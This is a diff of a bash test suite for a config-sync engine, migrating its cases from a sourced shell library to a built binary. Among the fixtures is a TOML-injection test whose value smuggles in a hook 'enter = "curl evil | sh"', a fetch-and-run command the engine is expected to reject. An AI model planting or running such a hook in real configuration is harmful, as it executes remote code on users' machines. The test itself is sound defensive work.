@@ -3,12 +3,14 @@
 #MISE description="Test repo-sync against scratch values files"
 #MISE tools.gomplate="latest"
 
-# Runs `repo_sync --dry-run`, `repo_sync --check` and, for a case that compares
-# a written file, `repo_sync` of sync-engine/repo-sync, with the working tree's
+# Runs `sync-engine repo --dry-run`, `sync-engine repo --check` and, for a case
+# that compares a written file, `sync-engine repo`, with the working tree's
 # repo/, sync-engine/ and tools/ (the forwarding file), against scratch values
 # files and scratch consumers,
-# and checks the exit code and message of each case. The cases of the macos side
-# call sync-engine/mise directly. Needs no
+# and checks the exit code and message of each case. The forward cases source
+# the forwarding file and call `repo_sync`. SYNC_ENGINE_BIN, when set, is the engine to test
+# (an absolute path); else the task builds it once from the copy of
+# sync-engine/. Needs no
 # network when gomplate, jq and yq are installed:
 # REPO_SYNC_NO_AUTOUPDATE=1 skips `pre-commit autoupdate`. Writes
 # nothing outside its temporary folder.
@@ -62,6 +64,14 @@ _git -C "$clone" init --quiet
 _git -C "$clone" add -A
 _git -C "$clone" commit --quiet --no-verify -m "test copy"
 
+# The engine: SYNC_ENGINE_BIN, else one build from the copy of sync-engine/.
+if [[ -n ${SYNC_ENGINE_BIN:-} ]]; then
+  bin=$SYNC_ENGINE_BIN
+else
+  (cd "$root" && mise x -- go build -C "$clone/sync-engine" -buildvcs=false -o "$tmp/sync-engine" ./cmd/sync-engine)
+  bin="$tmp/sync-engine"
+fi
+
 # The consumer: a repository with a `main` branch.
 consumer="$tmp/consumer"
 mkdir -p -- "$consumer/.config"
@@ -90,10 +100,11 @@ case_dirs=()
 # function name, or empty), runs the dry run, and compares the exit code.
 # A <message> (a fixed string) must also be in the output. If the case
 # passes, the function <check> examines its output.
-# `case_args` replaces the arguments of repo_sync for the case; a case with
+# `case_args` replaces the arguments of the engine for the case; a case with
 # `--check` in them runs without SYNC_ENGINE_CLONE. `CASE_SYNC_ENGINE_URL`, when
 # set, becomes SYNC_ENGINE_URL of the case. `CASE_LIB=forward` sources the
-# forwarding file at the old library path, with REPO_SYNC_CLONE only.
+# forwarding file at the old library path, with REPO_SYNC_CLONE only, and
+# calls `repo_sync`.
 # `CASE_CLONE=none` sets no clone variable.
 # `CASE_CALL` names a function that the case runs instead of the library.
 run_case() {
@@ -134,18 +145,21 @@ case_body() {
       "$CASE_CALL"
       exit
     fi
-    lib=$clone/sync-engine/repo-sync
     if [[ ${CASE_LIB:-} == forward ]]; then
-      lib=$clone/tools/repo-sync/.config/mise/tasks/_scripts/repo-sync
       [[ ${CASE_CLONE:-} == none ]] || export REPO_SYNC_CLONE=$clone
-    elif [[ ${CASE_CLONE:-} != none && " $args " != *" --check "* ]]; then
+      # `set -e` does not apply on the left of `||`, so a failed source stops
+      # here.
+      # shellcheck source=/dev/null
+      source "$clone/tools/repo-sync/.config/mise/tasks/_scripts/repo-sync" || exit $?
+      # shellcheck disable=SC2086
+      repo_sync $args
+      exit
+    fi
+    if [[ ${CASE_CLONE:-} != none && " $args " != *" --check "* ]]; then
       export SYNC_ENGINE_CLONE=$clone
     fi
-    # `set -e` does not apply on the left of `||`, so a failed source stops here.
-    # shellcheck source=/dev/null
-    source "$lib" || exit $?
     # shellcheck disable=SC2086
-    repo_sync $args
+    "$bin" repo $args
   ) > "$log" 2>&1 || got=$?
   # After the dry run, so that its output stays plain for the greps.
   [[ -n $case_color ]] && export FORCE_COLOR=1
@@ -163,7 +177,7 @@ case_body() {
   printf '%s\n' "$((failures + 1))" > "$dir/failures"
 }
 
-# run_check: run_case with `repo_sync --check`.
+# run_check: run_case with `sync-engine repo --check`.
 run_check() { case_args=--check run_case "$@"; }
 
 # Wait for the oldest case, print its output and add its failures. A case
@@ -864,12 +878,17 @@ env = [ "ci" ]
 [branch.main]
 direct_commit = "yes"' '' "environment 'prod' in" check_two_errors
 
-# The forwarding file at the old library path, and no clone.
-CASE_LIB=forward run_case "the forwarding file with REPO_SYNC_CLONE" 0 'environments = [ "dev" ]'
+# The forwarding file at the old library path, and no clone. The case "the
+# forwarding file through the shim" runs it with REPO_SYNC_CLONE.
 CASE_LIB=forward CASE_CLONE=none run_case "the forwarding file without a clone" 2 'environments = [ "dev" ]' '' \
   'repo-sync: no clone - run mise run setup:configs'
 CASE_CLONE=none run_case "repo_sync without SYNC_ENGINE_CLONE" 2 'environments = [ "dev" ]' '' \
   'mise run setup:configs'
+
+# A repository without a values file: `setup:configs` relies on this stop for a
+# member that has not adopted bootstrap.
+no_values_file() { rm -f -- "$values"; }
+run_case "no values file" 2 'environments = [ "dev" ]' no_values_file 'not found - it lists the tools to sync'
 
 # A template of the repo-sync tool that prints .sync_engine. The consumer
 # already has its output file, so the dry run shows its diff.
@@ -1073,14 +1092,13 @@ check_exact() {
     failures=$((failures + 1))
   fi
 }
-# case_rerun [<arg>]: run repo_sync again in the case. The log gets its output.
+# case_rerun [<arg>]: run the engine again in the case. The log gets its
+# output.
 case_rerun() {
   (
     unset FORCE_COLOR SYNC_ENGINE_URL REPO_SYNC_CLONE
     export REPO_SYNC_VALUES=$values MISE_PROJECT_ROOT=$consumer REPO_SYNC_NO_AUTOUPDATE=1 SYNC_ENGINE_CLONE=$clone
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/repo-sync" || exit $?
-    repo_sync "$@"
+    "$bin" repo "$@"
   ) > "$log" 2>&1
 }
 
@@ -1892,7 +1910,7 @@ merge_link_folder() {
   merge_link_tool
   ln -s -- "$tmp/outside" "$consumer/.config/merger"
 }
-# The sync runs in the repository, so `_se_path` shows both paths as relative.
+# The sync runs in the repository, so the engine shows both paths as relative.
 # `cd` tidies PWD (a TMPDIR that ends in / gives //): the root takes its form.
 merge_link_folder_here() {
   merge_link_folder
@@ -2299,7 +2317,7 @@ stale_seed() {
 check_stale_seed() { check_that "a listed seed: no would remove" log_lacks 'would remove'; }
 run_case "the stale rule, a listed seed" 0 "$no_tool_values" stale_seed '' check_stale_seed
 
-# A merge task of the other branch model: `_rs_remove` removes it, the stale rule
+# A merge task of the other branch model: the engine removes it, the stale rule
 # does not log it again.
 stale_merge_task() {
   header_file .config/mise/tasks/code/merge/develop
@@ -2320,28 +2338,6 @@ check_manifest_bytes() {
   check_that "the manifest bytes: no trailing blank" test "$(grep -c ' $' "$file")" = 0
 }
 case_args=' ' run_case "the bytes of the manifest" 0 "$no_tool_values" '' '' check_manifest_bytes
-
-# The macos link mode, a direct call: the stale rule resolves a link and removes
-# the real file, and the link stays. `repo_sync --check` only sets up the case.
-manifest_macos_call() {
-  (
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/common"
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/manifest"
-    _se_manifest_stale macos "old${tab}.config/mise/conf.d/old/mise.toml" '' "$tmp/home" 0
-  ) >> "$log" 2>&1
-}
-check_manifest_macos() {
-  mkdir -p -- "$tmp/home/.config" "$tmp/dotfiles/mise/conf.d/old"
-  ln -s -- "$tmp/dotfiles/mise" "$tmp/home/.config/mise"
-  printf '%s\n' '# Synced from bootstrap: x. Do not edit this file.' > "$tmp/dotfiles/mise/conf.d/old/mise.toml"
-  check_that "the macos link mode: the call exits 0" manifest_macos_call
-  check_that "the macos link mode: the real file is gone" no_file "$tmp/dotfiles/mise/conf.d/old/mise.toml"
-  check_that "the macos link mode: the empty folder is gone" no_file "$tmp/dotfiles/mise/conf.d/old"
-  check_that "the macos link mode: the link stays" link_is "$tmp/home/.config/mise" "$tmp/dotfiles/mise"
-}
-run_check "the stale rule, the macos link mode" 0 "$no_tool_values" '' '' check_manifest_macos
 
 # A dry run names the manifest that differs, and writes nothing.
 stale_differs() { manifest_file "oldtool${tab}nothing.txt"; }
@@ -2511,52 +2507,6 @@ check_stale_nested_clone() {
 }
 case_args=' ' run_case "the stale rule, a listed file of a nested clone that is a folder member" 0 "$member_mem_values" \
   stale_nested_clone '' check_stale_nested_clone
-
-# The macos link mode reads the rows too: a clean row behind a linked folder goes,
-# and a bad row is refused. `repo_sync --check` only sets up the case.
-manifest_macos_rows_call() {
-  (
-    local rows
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/common"
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/manifest"
-    rows=$(_se_manifest_read macos "$consumer/.config/repo-generated.tsv") || exit $?
-    _se_manifest_stale macos "$rows" '' "$tmp/home" 0
-  ) >> "$log" 2>&1
-}
-check_manifest_macos_rows() {
-  mkdir -p -- "$tmp/home/.config" "$tmp/dotfiles/mise/conf.d/old"
-  ln -s -- "$tmp/dotfiles/mise" "$tmp/home/.config/mise"
-  printf '%s\n' '# Synced from bootstrap: x. Do not edit this file.' \
-    | tee "$tmp/dotfiles/mise/conf.d/old/mise.toml" "$tmp/outside.txt" > /dev/null
-  manifest_file "old${tab}.config/mise/conf.d/old/mise.toml" "x${tab}../outside.txt"
-  check_that "the macos rows: the calls exit 0" manifest_macos_rows_call
-  check_that "the macos rows: the real file is gone" no_file "$tmp/dotfiles/mise/conf.d/old/mise.toml"
-  check_that "the macos rows: the link stays" link_is "$tmp/home/.config/mise" "$tmp/dotfiles/mise"
-  check_that "the macos rows: a bad row is skipped" \
-    log_has "$consumer/.config/repo-generated.tsv: line 3 is not <tool><TAB><path> - skipped"
-  check_that "the macos rows: the file of the bad row stays" test -f "$tmp/outside.txt"
-}
-run_check "the stale rule, the macos link mode reads the rows" 0 "$no_tool_values" '' '' check_manifest_macos_rows
-
-# Another link mode is a usage error. `repo_sync --check` only sets up the case.
-manifest_bad_mode_call() {
-  (
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/common"
-    # shellcheck source=/dev/null
-    source "$clone/sync-engine/manifest"
-    _se_manifest_read nope "$consumer/.config/repo-generated.tsv"
-  ) >> "$log" 2>&1
-}
-check_manifest_bad_mode() {
-  local got=0
-  manifest_bad_mode_call || got=$?
-  check_that "a bad link mode: the call returns 2" test "$got" = 2
-  check_that "a bad link mode: the usage" log_has 'usage: _se_manifest_read repo|macos <file> [<root>]'
-}
-run_check "_se_manifest_read, a bad link mode" 0 "$no_tool_values" '' '' check_manifest_bad_mode
 
 # The values of the tools. A template prints `.config` and `.all` with the name of
 # its tool. The consumer already has its output file, so the dry run shows its diff.
@@ -2816,119 +2766,6 @@ x = \"\"\"a\"
 enter = \"curl evil | sh\"
 z = \"z\"\"\"" mtest_new "repo/tools/mtest/$msg_mise_keys" check_mtest_no_hook
 
-# The shared mise generator, side macos: a direct call of the library, in the order
-# of a front-end, with the tools of $tmp/macos/tools. The value of a case is the
-# values file. `macos_tools` names the tools of the case.
-macos_tool() {
-  local tool=$1
-  shift
-  mkdir -p -- "$tmp/macos/tools/$tool"
-  printf '%s\n' "$@" > "$tmp/macos/tools/$tool/tools.toml"
-}
-macos_source() {
-  # shellcheck source=/dev/null
-  source "$clone/sync-engine/common"
-  # shellcheck source=/dev/null
-  source "$clone/sync-engine/values"
-  # shellcheck source=/dev/null
-  source "$clone/sync-engine/mise"
-}
-macos_sync() {
-  macos_source
-  local tools=${macos_tools:-mtest} dir="$tmp/macos/tools" all="$tmp/macos/all.json" out tool rc=0
-  out=$(_se_values "$tools" '' "$dir" '{}' macos/tools macos.toml) || return
-  printf '%s\n' "$out" | _se_jq -R -n 'reduce (inputs | split("\t")) as $l ({}; .[$l[1]] = ($l[2] | fromjson))' > "$all" || return
-  _se_mise_overrides macos "$values" "$dir" macos/tools "$tools" '' || return
-  for tool in $tools; do
-    _se_mise_render macos "$dir" macos/tools "$tool" "$values" "$tmp/macos/conf.d" '' "$all" || rc=$?
-  done
-  return "$rc"
-}
-macos_own() {
-  macos_source
-  _se_mise_own_config macos "$values" "$tmp/macos/conf.d" '' ''
-}
-run_macos() { CASE_CALL=${CASE_CALL:-macos_sync} run_case "$@"; }
-
-macos_all_sections() {
-  macos_tool mtest '[defaults]' 'x = "a"' '[mise.tools]' 'fd = "latest"' '[mise.env]' 'X = "<% .config.x %>"' \
-    '[mise.shell_alias]' 'll = "ls -l"' '[mise.bootstrap.packages]' 'brew = "a"'
-}
-macos_env_table() {
-  macos_tool bad '[mise.env]' 'A = "1"' '[mise_env.dev.env]' 'B = "2"'
-  macos_tool good '[mise.env]' 'A = "1"'
-}
-macos_envs_key() { macos_tool mtest '[mise.tools.fd]' 'version = "latest"' 'envs = [ "dev" ]'; }
-macos_found_key() { macos_tool mtest '[mise.tools.fd]' 'version = "latest"' 'requires_found = [ "x" ]'; }
-macos_two_tools() {
-  macos_tool mtest '[mise.env]' 'X = "a"'
-  macos_tool good '[mise.env]' 'A = "1"'
-}
-macos_env_x() { macos_tool mtest '[mise.env]' 'X = "a"'; }
-
-macos_file() { printf '%s' "$tmp/macos/conf.d/$1/mise.toml"; }
-check_macos_sections() {
-  local file name="the macos side: all the sections"
-  file=$(macos_file mtest)
-  check_that "$name: the header" file_has '# Synced from bootstrap: macos/tools/mtest/tools.toml. Do not edit this file.' "$file"
-  check_that "$name: [tools]" file_has 'fd = "latest"' "$file"
-  check_that "$name: [env], rendered" file_has 'X = "a"' "$file"
-  check_that "$name: [shell_alias]" file_has 'll = "ls -l"' "$file"
-  check_that "$name: [bootstrap.packages]" file_has '[bootstrap.packages]' "$file"
-  check_that "$name: no mise.dev.toml" no_file "$tmp/macos/conf.d/mtest/mise.dev.toml"
-}
-check_macos_one_bad() {
-  check_that "the macos side, [mise_env.*]: the tool writes nothing" no_file "$tmp/macos/conf.d/bad"
-  check_that "the macos side, [mise_env.*]: the other tool has its file" file_has 'A = "1"' "$(macos_file good)"
-}
-check_macos_no_write() { check_that "the macos side: no file is written" no_file "$tmp/macos/conf.d"; }
-check_macos_override() {
-  check_that "the macos side, [overrides.mise.env]: the comment" file_has 'X = "c"  # override: macos.toml' "$(macos_file mtest)"
-}
-check_macos_own() {
-  local file name="the macos side, the own config"
-  file=$(macos_file zz-macos)
-  check_that "$name: the header" file_has '# Synced from bootstrap: macos.toml [mise]. Do not edit this file.' "$file"
-  check_that "$name: the second line" file_has '# The next sync replaces it, and a manual change is lost.' "$file"
-  check_that "$name: [shell_alias]" file_has 'll = "ls -l"' "$file"
-  check_that "$name: [env], rendered" file_has "H = \"$HOME\"" "$file"
-}
-
-run_macos "the macos side: mise.toml with all the sections" 0 '' macos_all_sections '' check_macos_sections
-macos_tools='bad good' run_macos "the macos side: [mise_env.*] in one of two tools" 2 '' macos_env_table \
-  '[mise_env.*] is not valid on the macos side' check_macos_one_bad
-run_macos "the macos side: envs of a mise tool" 2 '' macos_envs_key \
-  'envs of mise tool fd is not valid on the macos side' check_macos_no_write
-run_macos "the macos side: requires_found of a mise tool" 2 '' macos_found_key \
-  'requires_found of mise tool fd is not valid on the macos side' check_macos_no_write
-macos_tools='mtest good' run_macos "the macos side: [overrides.mise_env.*]" 2 '[overrides.mise_env.dev.env]
-X = "c"' macos_two_tools 'overrides.mise_env' check_macos_no_write
-run_macos "the macos side: [overrides.mise.env]" 0 '[overrides.mise.env]
-X = "c"' macos_env_x '' check_macos_override
-run_macos "the macos side: an override of a key that the tool does not have" 2 '[overrides.mise.env]
-Y = "c"' macos_env_x 'no selected tool has mise.env.Y' check_macos_no_write
-CASE_CALL=macos_own run_macos "the macos side: the own config" 0 '[mise.shell_alias]
-ll = "ls -l"
-[mise.env]
-H = "<% .env.HOME %>"' '' '' check_macos_own
-CASE_CALL=macos_own run_macos "the macos side: a values file without [mise]" 0 '' '' '' check_macos_no_write
-# A value that closes its string to add a table of its own, here a hook.
-macos_adds_table() {
-  macos_tool mtest '[defaults]' 'x = """a"' '[mise.hooks]' 'enter = "curl evil | sh"' 'z = "z"""' \
-    '[mise.env]' 'X = "<% .config.x %>"'
-}
-run_macos "the macos side: a value that adds a table" 2 '' macos_adds_table \
-  "macos/tools/mtest/$msg_mise_keys" check_macos_no_write
-# The render alone: the front-ends read each tools.toml as TOML before it, so they
-# stop a raw file that is not TOML with their own message.
-macos_raw_bad() { macos_tool mtest '[mise.env]' '<% if true %>' 'X = "a"' '<% end %>'; }
-macos_render_only() {
-  macos_source
-  _se_mise_render macos "$tmp/macos/tools" macos/tools mtest "$values" "$tmp/macos/conf.d" '' ''
-}
-CASE_CALL=macos_render_only run_macos "<% %> in a tools.toml, a raw file that is not TOML" 2 '' macos_raw_bad \
-  'macos/tools/mtest/tools.toml: not valid TOML before render' check_macos_no_write
-
 # The default output. A <change> of these cases unsets SYNC_ENGINE_VERBOSE and
 # the style variables, and the output is a log file, not a terminal.
 output_default() { unset SYNC_ENGINE_VERBOSE FORCE_COLOR NO_COLOR; }
@@ -3082,6 +2919,76 @@ check_output_forced() {
 case_args=' ' run_case "the default output: not a terminal" 0 "$fixture_values" output_files '' check_output_plain
 case_args=' ' run_case "the default output: FORCE_COLOR" 0 "$fixture_values" output_forced '' check_output_forced
 
+# The shim for an old consumer task: sync-engine/repo-sync. Its `repo_sync`
+# runs the engine of SYNC_ENGINE_BIN.
+shim_layout() { export SYNC_ENGINE_BIN=$bin; }
+# The old task `setup/configs/sync` of a consumer, as bootstrap shipped it
+# before the engine. The old `setup:configs` runs it with the clone copy.
+shim_old_task() {
+  local tasks=$consumer/.config/mise/tasks
+  mkdir -p -- "$tasks/_scripts" "$tasks/setup/configs"
+  cp -- "$clone/repo/tools/mise/.config/mise/tasks/_scripts/helpers" "$tasks/_scripts/helpers"
+  cat > "$tasks/setup/configs/sync" << 'EOF'
+#!/usr/bin/env bash
+# Synced from bootstrap: repo/tools/repo-sync/.config/mise/tasks/setup/configs/sync. Do not edit this file.
+# The next sync replaces it, and a manual change is lost.
+
+#MISE description="Sync the shared files from the bootstrap clone of setup:configs"
+#MISE hide=true
+#MISE tools.pre-commit="latest"
+
+#USAGE flag "--dry-run" help="show the changes without writing them"
+
+set -euo pipefail
+# shellcheck source=/dev/null
+source "${MISE_PROJECT_ROOT}/.config/mise/tasks/_scripts/helpers"
+
+if [[ -z ${SYNC_ENGINE_CLONE:-} ]]; then
+  print_error "SYNC_ENGINE_CLONE is not set - run mise run setup:configs, which clones bootstrap"
+  exit 2
+fi
+# shellcheck source=/dev/null
+source "${SYNC_ENGINE_CLONE}/sync-engine/repo-sync"
+
+print_header "Syncing the shared files from bootstrap ..."
+
+if [[ "${usage_dry_run:-false}" == "true" ]]; then
+  repo_sync --dry-run
+else
+  repo_sync
+fi
+EOF
+  chmod 755 "$tasks/setup/configs/sync"
+  SYNC_ENGINE_CLONE=$clone REPO_SYNC_CLONE=$clone usage_dry_run=true bash "$tasks/setup/configs/sync"
+}
+check_shim_old_task() {
+  check_that "the old sync task through the shim: its header" log_has 'Syncing the shared files from bootstrap ...'
+  check_that "the old sync task through the shim: a would update line" log_has "would update $consumer/"
+}
+CASE_CALL=shim_old_task run_case "the old sync task through the shim" 0 'environments = [ "dev" ]' shim_layout \
+  'Dry run: ' check_shim_old_task
+CASE_LIB=forward run_case "the forwarding file through the shim" 0 'environments = [ "dev" ]' shim_layout \
+  'Dry run: '
+shim_call() {
+  export SYNC_ENGINE_CLONE=$clone
+  # shellcheck source=/dev/null
+  source "$clone/sync-engine/repo-sync"
+  repo_sync --dry-run
+}
+shim_bad_version() {
+  shim_layout
+  unset SYNC_ENGINE_BIN
+  printf '%s\n' v1.2 > "$clone/sync-engine/VERSION"
+}
+CASE_CALL=shim_call run_case "the shim, a VERSION that is not MAJOR.MINOR.PATCH" 5 'environments = [ "dev" ]' \
+  shim_bad_version "repo-sync: sync-engine/VERSION of the clone is not MAJOR.MINOR.PATCH ('v1.2') - nothing synced"
+shim_bin_missing() {
+  shim_layout
+  export SYNC_ENGINE_BIN=$tmp/missing
+}
+CASE_CALL=shim_call run_case "the shim, a SYNC_ENGINE_BIN that is not a file" 2 'environments = [ "dev" ]' \
+  shim_bin_missing 'is not an executable file - nothing synced'
+
 # The examples of repo/examples/. Each values file must pass a dry run in a
 # consumer with its members: a folder for each folder member, and a git
 # submodule for each submodule member. The dry run refuses an unknown tool, a
@@ -3107,26 +3014,33 @@ while ((${#case_pids[@]})); do
   collect_case
 done
 
-# The cache and the lock of setup:configs. A fake `mise` replaces
-# `mise run setup:configs:sync`: it records the commit of the copy that it
-# gets, when the copy is a clone outside the cache and the lock is released.
-# It adds one line for each call, with the folder of `--cd` after the commit.
-# The task is rendered with one submodule `sub`.
+# The cache and the lock of setup:configs. A fake engine, through
+# SYNC_ENGINE_BIN, replaces `sync-engine repo`: it records the commit of the
+# copy that it gets, when the copy is a clone outside the cache, the lock is
+# released and it runs in the folder of MISE_PROJECT_ROOT. It adds one line for
+# each call, with the folder below the root and the flag after the commit. A
+# fake `mise` records each call, because the task must not call mise with
+# SYNC_ENGINE_BIN set. The task is rendered with one submodule `sub`.
 task="$tmp/setup-configs"
 printf '{"members":["sub"],"member_types":{"sub":"submodule"},"member_folders":{"sub":"sub"},"sync_engine":"%s/sync-engine"}\n' "$root" > "$tmp/ctx.json"
 gomplate --left-delim '<%' --right-delim '%>' -c ".=$tmp/ctx.json" \
   -f "$root/repo/tools/repo-sync/.config/mise/tasks/setup/configs/_default.tmpl" -o "$task"
 cache="$tmp/cache/sync-engine"
 mkdir -p -- "$tmp/bin"
+cat > "$tmp/bin/sync-engine" << 'EOF'
+#!/usr/bin/env bash
+[[ ${1:-} == repo && $(pwd -P) == "$(cd -- "$MISE_PROJECT_ROOT" && pwd -P)" && -e $SYNC_ENGINE_CLONE/.git && $SYNC_ENGINE_CLONE != "$XDG_CACHE_HOME"/* && ! -e $XDG_CACHE_HOME/sync-engine/lock ]] || exit 1
+sub=${MISE_PROJECT_ROOT#"$SYNC_ROOT"}
+sub=${sub#/}
+printf '%s\n' "$(git -C "$SYNC_ENGINE_CLONE" rev-parse HEAD)${sub:+ $sub}${2:+ $2}" >> "$SYNC_OUT"
+[[ -z ${SYNC_FAIL:-} || ${SYNC_FAIL_IN:-$sub} != "$sub" ]] || exit "$SYNC_FAIL"
+EOF
 cat > "$tmp/bin/mise" << 'EOF'
 #!/usr/bin/env bash
-[[ -e $SYNC_ENGINE_CLONE/.git && $SYNC_ENGINE_CLONE != "$XDG_CACHE_HOME"/* && ! -e $XDG_CACHE_HOME/sync-engine/lock && ${REPO_SYNC_CLONE:-} == "$SYNC_ENGINE_CLONE" ]] || exit 1
-cd=''
-[[ ${2:-} == --cd ]] && cd=${3#"$MISE_PROJECT_ROOT"/}
-printf '%s\n' "$(git -C "$SYNC_ENGINE_CLONE" rev-parse HEAD)${cd:+ $cd}" >> "$SYNC_OUT"
-[[ -z ${SYNC_FAIL:-} ]] || exit "$SYNC_FAIL"
+printf '%s\n' "mise $*" >> "$SYNC_OUT"
+exit 1
 EOF
-chmod +x "$tmp/bin/mise"
+chmod +x "$tmp/bin/sync-engine" "$tmp/bin/mise"
 
 # A remote with one commit: file:// so that --depth applies.
 new_remote() {
@@ -3136,10 +3050,14 @@ new_remote() {
 new_remote "$tmp/remote"
 new_remote "$tmp/remote2"
 
+# CONFIGS_BIN sets SYNC_ENGINE_BIN of the run; `none` unsets it.
 run_configs() {
+  local bin_env=(SYNC_ENGINE_BIN="${CONFIGS_BIN:-$tmp/bin/sync-engine}")
+  [[ ${CONFIGS_BIN:-} != none ]] || bin_env=(-u SYNC_ENGINE_BIN)
   rm -f -- "$tmp/synced"
-  env -u SYNC_ENGINE_CACHE MISE_PROJECT_ROOT="${CONFIGS_ROOT:-$root}" PATH="$tmp/bin:$PATH" \
-    XDG_CACHE_HOME="${cache%/*}" SYNC_ENGINE_URL="$1" SYNC_OUT="$tmp/synced" bash "$task" > "$log" 2>&1
+  env -u SYNC_ENGINE_CACHE "${bin_env[@]}" MISE_PROJECT_ROOT="${CONFIGS_ROOT:-$root}" PATH="$tmp/bin:$PATH" \
+    XDG_CACHE_HOME="${cache%/*}" SYNC_ENGINE_URL="$1" SYNC_OUT="$tmp/synced" SYNC_ROOT="${CONFIGS_ROOT:-$root}" \
+    bash "$task" > "$log" 2>&1
 }
 
 # check_configs <name> <want> <got> [<commit>]: the exit code, the commit that
@@ -3214,14 +3132,11 @@ if [[ ! -e $cache/repo/.git ]]; then
   failures=$((failures + 1))
 fi
 
-# The member flags. The member `sub` of a scratch root has its own sync task,
-# except in the case without it.
+# The member flags. The member `sub` is a folder of a scratch root.
 commit=$(git -C "$tmp/remote" rev-parse HEAD)
 members_root="$tmp/members"
-mkdir -p -- "$members_root/.config/mise/tasks/_scripts" "$members_root/sub/.config/mise/tasks/setup/configs"
+mkdir -p -- "$members_root/.config/mise/tasks/_scripts" "$members_root/sub"
 cp -- "$root/.config/mise/tasks/_scripts/helpers" "$members_root/.config/mise/tasks/_scripts/helpers"
-printf '%s\n' '#!/usr/bin/env bash' > "$members_root/sub/.config/mise/tasks/setup/configs/sync"
-chmod +x "$members_root/sub/.config/mise/tasks/setup/configs/sync"
 
 # check_synced <name> <lines>: the lines that the fake mise recorded.
 check_synced() {
@@ -3259,13 +3174,39 @@ SYNC_FAIL=2 usage_all=true CONFIGS_ROOT=$members_root run_configs "file://$tmp/r
 check_configs "setup:configs --all, the root fails" 2 "$got" "$commit"
 check_synced "setup:configs --all, the root fails" "$commit"
 
-rm -f -- "$members_root/sub/.config/mise/tasks/setup/configs/sync"
 got=0
-usage_all=true CONFIGS_ROOT=$members_root run_configs "file://$tmp/remote" || got=$?
-check_configs "setup:configs --all, a member without the sync task" 2 "$got" "$commit"
-check_synced "setup:configs --all, a member without the sync task" "$commit"
-grep -qF "sub has no setup:configs:sync task" "$log" || {
-  print_error "setup:configs --all, a member without the sync task: no error message"
+SYNC_FAIL=2 SYNC_FAIL_IN=sub usage_all=true CONFIGS_ROOT=$members_root run_configs "file://$tmp/remote" || got=$?
+check_configs "setup:configs --all, the member fails" 2 "$got" "$commit"
+check_synced "setup:configs --all, the member fails" "$commit"$'\n'"$commit sub"
+
+got=0
+usage_dry_run=true usage_sub=true CONFIGS_ROOT=$members_root run_configs "file://$tmp/remote" || got=$?
+check_configs "setup:configs --dry-run --sub" 0 "$got" "$commit --dry-run"
+check_synced "setup:configs --dry-run --sub" "$commit --dry-run"$'\n'"$commit sub --dry-run"
+
+# The engine. Without SYNC_ENGINE_BIN, the task reads sync-engine/VERSION of the
+# copy. A value that is not MAJOR.MINOR.PATCH stops it before any mise call.
+version_remote="$tmp/remote-version"
+new_remote "$version_remote"
+mkdir -p -- "$version_remote/sync-engine"
+printf '%s\n' v1.2 > "$version_remote/sync-engine/VERSION"
+_git -C "$version_remote" add -A
+_git -C "$version_remote" commit --quiet --no-verify -m "a bad VERSION"
+got=0
+CONFIGS_BIN=none run_configs "file://$version_remote" || got=$?
+check_configs "setup:configs, a VERSION that is not MAJOR.MINOR.PATCH" 5 "$got"
+check_synced "setup:configs, a VERSION that is not MAJOR.MINOR.PATCH" ''
+grep -qF "sync-engine/VERSION of the clone is not MAJOR.MINOR.PATCH ('v1.2') - nothing synced" "$log" || {
+  print_error "setup:configs, a VERSION that is not MAJOR.MINOR.PATCH: no error message"
+  failures=$((failures + 1))
+}
+
+got=0
+CONFIGS_BIN="$tmp/no-such-engine" run_configs "file://$tmp/remote" || got=$?
+check_configs "setup:configs, a SYNC_ENGINE_BIN that is not a file" 2 "$got"
+check_synced "setup:configs, a SYNC_ENGINE_BIN that is not a file" ''
+grep -qF "SYNC_ENGINE_BIN $tmp/no-such-engine is not an executable file - nothing synced" "$log" || {
+  print_error "setup:configs, a SYNC_ENGINE_BIN that is not a file: no error message"
   failures=$((failures + 1))
 }
 
@@ -3454,139 +3395,6 @@ check_configs "$name" 0 "$got"
 check_paths "$name" -n "$old.lock"
 check_configs_log "$name" -l 'Removed the old cache'
 
-# The copy of the local sync task. The remote has both files of the copy. Each
-# case has its own scratch root and its own cache.
-task_remote="$tmp/remote-task"
-sync_path=.config/mise/tasks/setup/configs/sync
-helpers_path=.config/mise/tasks/_scripts/helpers
-new_remote "$task_remote"
-mkdir -p -- "$task_remote/repo/tools/repo-sync/${sync_path%/*}" "$task_remote/repo/tools/mise/${helpers_path%/*}"
-cp -- "$root/repo/tools/repo-sync/$sync_path" "$task_remote/repo/tools/repo-sync/$sync_path"
-cp -- "$root/repo/tools/mise/$helpers_path" "$task_remote/repo/tools/mise/$helpers_path"
-_git -C "$task_remote" add -A
-_git -C "$task_remote" commit --quiet --no-verify -m "the sync task"
-task_commit=$(git -C "$task_remote" rev-parse HEAD)
-task_short=$(git -C "$task_remote" rev-parse --short HEAD)
-new_task_case() {
-  new_cache "$1"
-  task_root="${cache%/*}/root"
-  task_sync="$task_root/$sync_path"
-  task_helpers="$task_root/$helpers_path"
-  mkdir -p -- "$task_root/${sync_path%/*}" "$task_root/${helpers_path%/*}"
-  cp -- "$root/repo/tools/mise/$helpers_path" "$task_helpers"
-}
-stale_sync() {
-  rm -f -- "$1"
-  printf '%s\n' '#!/usr/bin/env bash' '# an old sync task' > "$1"
-  chmod 755 "$1"
-}
-is_stale_sync() { grep -qxF '# an old sync task' "$1"; }
-is_clone_sync() { cmp -s -- "$1" "$task_remote/repo/tools/repo-sync/$sync_path"; }
-run_task() { CONFIGS_ROOT=$task_root run_configs "file://$task_remote"; }
-# settle_task: a first run makes both local files equal to the clone.
-settle_task() {
-  stale_sync "$task_sync"
-  got=0
-  run_task || got=$?
-  check_configs "$name, the first run" 0 "$got" "$task_commit"
-}
-# check_lines_order <name> <first> <second>: <first> is on an earlier line.
-check_lines_order() {
-  local first second
-  first=$(grep -nF -- "$2" "$log" | head -n 1 | cut -d: -f1) || first=''
-  second=$(grep -nF -- "$3" "$log" | head -n 1 | cut -d: -f1) || second=''
-  check_that "$1: '$2' is above '$3'" test "${first:-0}" -gt 0 -a "${second:-0}" -gt "${first:-0}"
-}
-
-name="setup:configs replaces a stale local sync task"
-new_task_case task-stale
-stale_sync "$task_sync"
-got=0
-run_task || got=$?
-check_configs "$name" 0 "$got" "$task_commit"
